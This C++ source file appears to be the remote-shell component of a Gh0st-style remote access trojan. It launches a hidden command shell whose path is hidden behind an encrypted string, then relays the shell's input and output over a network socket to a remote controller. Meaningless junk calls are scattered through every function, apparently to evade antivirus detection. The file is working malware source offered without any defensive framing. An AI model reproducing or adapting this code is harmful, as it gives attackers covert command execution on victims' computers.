// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"

#include "ShellManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
	TCHAR szModule [MAX_PATH];

    SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
    }

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
    }

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	GetSystemDirectory(strShellPath, MAX_PATH);
	char str1[50] = "B[mZ,UfU";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), 12 );
	lstrcat(strShellPath, str1 );

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		CloseHandle(m_hReadPipeHandle);
		closesocket(NULL);
		CloseHandle(m_hWritePipeHandle);
		closesocket(NULL);
		CloseHandle(m_hReadPipeShell);
		closesocket(NULL);
		CloseHandle(m_hWritePipeShell);
		closesocket(NULL);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}

CShellManager::~CShellManager()
{
	TCHAR szModule [MAX_PATH];
	TerminateThread(m_hThreadRead, 0);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	TerminateProcess(m_hProcessHandle, 0);
	closesocket(NULL);
	TerminateThread(m_hThreadHandle, 0);
	closesocket(NULL);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	closesocket(NULL);
	TerminateThread(m_hThreadMonitor, 0);
	closesocket(NULL);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

    CloseHandle(m_hReadPipeHandle);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
    CloseHandle(m_hWritePipeHandle);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
    CloseHandle(m_hReadPipeShell);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
    CloseHandle(m_hWritePipeShell);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

    CloseHandle(m_hProcessHandle);
	closesocket(NULL);
	CloseHandle(m_hThreadHandle);
	closesocket(NULL);
	CloseHandle(m_hThreadMonitor);
	closesocket(NULL);
    CloseHandle(m_hThreadRead);
	closesocket(NULL);
	closesocket(NULL);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	TCHAR szModule [MAX_PATH];
	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	TCHAR szModule [MAX_PATH];

	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		Sleep(100);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// ·¢ËÍÊý¾Ý
			pThis->Send(lpBuffer, BytesRead);
			CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
			LocalFree(lpBuffer);
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		}
	}
	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	TCHAR szModule [MAX_PATH];

	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	TerminateThread(pThis->m_hThreadRead, 0);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	pThis->m_pClient->Disconnect();
	return 0;
}
